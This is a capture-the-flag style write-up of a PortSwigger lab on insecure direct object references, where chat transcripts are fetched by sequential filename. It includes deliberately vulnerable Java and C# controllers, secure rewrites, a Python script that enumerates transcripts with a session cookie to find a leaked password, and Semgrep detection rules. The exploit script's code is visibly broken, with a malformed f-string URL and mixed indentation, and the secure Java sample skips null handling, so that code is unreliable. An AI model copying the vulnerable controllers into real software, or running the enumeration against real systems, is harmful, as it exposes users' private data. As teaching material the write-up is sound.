---
title: "Lab 11 : Insecure direct object references"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [IDOR] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab11_access_control/
---  

## 1. Executive Summary

**Vulnerability:** Insecure Direct Object Reference (IDOR) with Static File Enumeration.

**Description:** The application saves sensitive user data (chat transcripts) to the server's file system using a predictable, incrementing naming convention (e.g., `1.txt`, `2.txt`). These files are served directly to the user without validating if the requester participated in that specific chat session.

**Impact:** Information Disclosure. An attacker can simply enumerate file names (incrementing the number) to retrieve and read the private chat logs of every user on the system, potentially discovering passwords or other sensitive data.

## 2. The Attack

**Objective:** Recover `carlos`'s password from a past chat log.

1. **Reconnaissance:** I initiated a Live Chat session, sent a message ("hello"), and clicked **"View transcript"**.
2. **Observation:** The application redirected me to a URL like `/download-transcript/2.txt`.
3. **Hypothesis:** The filename `2.txt` implies there was a `1.txt` before it. The ID seems sequential.
4. **Exploitation:** I manually changed the URL in the browser address bar to `/download-transcript/1.txt`.
    
    ![image.png](image.png)
    
5. **Result:** The server returned a text file content.
6. **Loot:** Reading the text file, I saw a conversation where `carlos` typed their password.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The application likely exposes a directory of files directly or uses a Controller that acts as a "dumb pipe," fetching whatever filename the user requests.

- **The Flaw:** Predictability + No Authorization. Using sequential integers (`1.txt`) makes guessing easy. Serving the file based purely on the requested name removes the security layer.
- **The Reality:** The server thinks, "You asked for file '1.txt', and it exists, so here it is."

### Java (Spring Boot)

```java
@Controller
public class TranscriptController {

    // VULNERABLE: Accepts a filename directly from the URL path or query.
    @GetMapping("/download-transcript/{filename:.+}")
    @ResponseBody
    public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
        
        // Technical Flow:
        // 1. User requests /download-transcript/1.txt
        // 2. 'filename' becomes "1.txt".
        // 3. Application builds a path to the server's hard drive.
        Path file = Paths.get("uploads/transcripts").resolve(filename);
        
        // 4. It returns the raw bytes of the file.
        // MISSING: Checking if the current user OWNS this transcript.
        Resource resource = new UrlResource(file.toUri());
        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + resource.getFilename() + "\"")
                .body(resource);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@PathVariable String filename`**: Captures the variable part of the URL (e.g., `1.txt`).
- **`Paths.get(...).resolve(filename)`**: Concatenates the base directory with the user input. (Note: This is also risky for *Path Traversal*, but here we focus on IDOR).
- **`ResponseEntity.ok().body(resource)`**: Streams the file content back to the browser. The controller acts solely as a file server, completely skipping business logic or permission checks.

### C# (ASP.NET Core)

```csharp
[Authorize]
public class ChatController : Controller
{
    private readonly IWebHostEnvironment _env;

    // VULNERABLE
    [HttpGet("download-transcript/{fileName}")]
    public IActionResult GetTranscript(string fileName)
    {
        // Technical Flow:
        // 1. Constructs path to wwwroot/transcripts/1.txt
        var filePath = Path.Combine(_env.WebRootPath, "transcripts", fileName);

        // 2. Checks if file exists on disk.
        if (!System.IO.File.Exists(filePath)) return NotFound();

        // 3. Serves the file directly.
        // MISSING: Database lookup to see if User.Identity.Name is a participant in Chat #1.
        return PhysicalFile(filePath, "text/plain");
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`Path.Combine(...)`**: secure way to build file paths, but doesn't validate *which* file is being accessed.
- **`PhysicalFile(...)`**: A helper method in ASP.NET Core that opens a file stream and sends it to the client. It handles headers like `Content-Type` automatically.
- **Logic Gap**: The code assumes that if the user knows the filename, they are allowed to have it.

### Mock PR Comment

The `downloadFile` endpoint accepts a `filename` and serves that file directly from the disk. Because our filenames are sequential (`1.txt`, `2.txt`), any user can download any other user's chat logs by modifying the URL.

**Recommendation:**

1. Store transcripts with a random GUID filename (e.g., `550e8400-e29b....txt`) so they cannot be guessed.
2. More importantly, do not expose the file directly via filename. Pass a `chatId`. Look up that Chat ID in the database, verify the current user is a participant, and *then* stream the associated file.

## 4. The Fix

**Explanation of the Fix:**
We introduce an **Indirect Reference**. The user asks for a `chatId` (database ID). The system checks permissions. If allowed, the system looks up the internal filepath (which the user never sees) and serves it.

### Secure Java

```java
@GetMapping("/download-transcript/{chatId}")
public ResponseEntity<Resource> downloadSecure(@PathVariable Long chatId, Principal principal) {
    
    // 1. Database Lookup (Indirection)
    ChatSession chat = chatRepository.findById(chatId);
    
    // 2. Authorization Check (The Fix)
    // "Is the person logged in (principal) actually the owner of this chat?"
    if (!chat.getParticipantUsername().equals(principal.getName())) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }
    
    // 3. Internal File Retrieval
    // The filename is stored in the DB, not provided by user input.
    Path file = Paths.get("uploads/transcripts").resolve(chat.getInternalFilename());
    Resource resource = new UrlResource(file.toUri());
    
    return ResponseEntity.ok().body(resource);
}
```

**Technical Flow & Syntax Explanation:**

- **`@PathVariable Long chatId`**: We request a database ID, not a filename.
- **`principal.getName()`**: We verify the identity of the requester.
- **`chat.getInternalFilename()`**: The filename (`1.txt` or a GUID) comes from our trusted database, not the user's URL. This effectively disconnects the URL from the file system.

### Secure C#

```csharp
[HttpGet("download-transcript/{id}")]
public IActionResult GetSecure(int id)
{
    // 1. Get the current user
    var currentUser = User.Identity.Name;

    // 2. Database Lookup & Auth Check
    var chatLog = _db.ChatLogs.FirstOrDefault(c => c.Id == id);

    if (chatLog == null || chatLog.Owner != currentUser) 
    {
        return Forbid(); // Return 403 if they don't own it
    }

    // 3. Serve the file using the path stored in the DB
    var filePath = Path.Combine(_env.WebRootPath, "transcripts", chatLog.StoredFileName);
    return PhysicalFile(filePath, "text/plain");
}
```

**Technical Flow & Syntax Explanation:**

- **`FirstOrDefault(c => c.Id == id)`**: Retrieves the metadata about the file.
- **`chatLog.Owner != currentUser`**: This is the gatekeeper. It ensures no one sees the file unless they own the record in the database.
- **`StoredFileName`**: The actual file on disk could be named anything. The user doesn't need to know.

## 5. Automation

*A Python script that iterates through filenames `1.txt` to `10.txt` to find the password.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_static_idor(url, session_cookie):
	target_path = "/download-transcript"
	cookies = {"session": session_cookie}

	print(f"[*] Target Base: {url}{target_path}")
	print("[*] Enumerating files 1.txt through 10.txt ...")

	for i in range(1,11):
		filename = f"{i}.txt"
		full_url = f"{url.rstrip('/'){target_path}{filename}}"

		try:
			resp = requests.get(full_url, cookies=cookies, timeout=5)

			if resp.status_code == 200:
				print(f"[+] Found {filename} (200 OK)")

				if "password" in resp.text.lower():
					print(f"\n[!!!] PASSWORD LEAK DETECTED in {filename}!")
					print("-" * 40)
                    print(resp.text.strip())
                    print("-" * 40)
                    # We found it, no need to spam requests
                    break
            elif resp.status_code == 404:
                print(f"[-] {filename} not found.")
            elif resp.status_code == 403:
                print(f"[-] {filename} - Access Denied.")
                
        except Exception as e:
            print(f"[!] Error requesting {filename}: {e}")

def main():
    ap = argparse.ArgumentParser(description="Exploit IDOR on Static Chat Logs")
    ap.add_argument("url", help="Base URL of the lab")
    ap.add_argument("session", help="Your valid session cookie")
    
    args = ap.parse_args()
    exploit_static_idor(args.url, args.session)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for Controllers that return a File resource where the file path is constructed directly from user input variables.*

**The Logic**
We want to flag code that:

1. Takes a String input from the request.
2. Uses that String to build a `Path` or `File` object.
3. Returns that File object in the response.
4. Does so without an obvious authorization check (heuristic).

### Java Rule

```yaml
rules:
  - id: java-path-traversal-idor-file-download
    languages: [java]
    message: |
      Potential IDOR/Path Traversal in file download. 
      The filename from the request is used directly to resolve the file path. 
      Verify that the user is authorized to access this specific file.
    severity: WARNING
    patterns:
      - pattern-inside: |
          public $RESP $METHOD(..., String $INPUT, ...) { ... }
      - pattern-either:
          # Spring Resource return
          - pattern: |
              Path $PATH = ... .resolve($INPUT);
              ...
              return ... .body(new UrlResource($PATH.toUri()));
          # Raw File return
          - pattern: |
              File $FILE = new File(..., $INPUT);
              ...
              return $FILE;
```

### C# Rule

```yaml
rules:
  - id: csharp-insecure-file-download
    languages: [csharp]
    message: "Potential IDOR in file download. 'PhysicalFile' uses input parameter directly."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public IActionResult $METHOD(..., string $INPUT, ...) { ... }
      - pattern: |
          return PhysicalFile(..., $INPUT, ...);
```
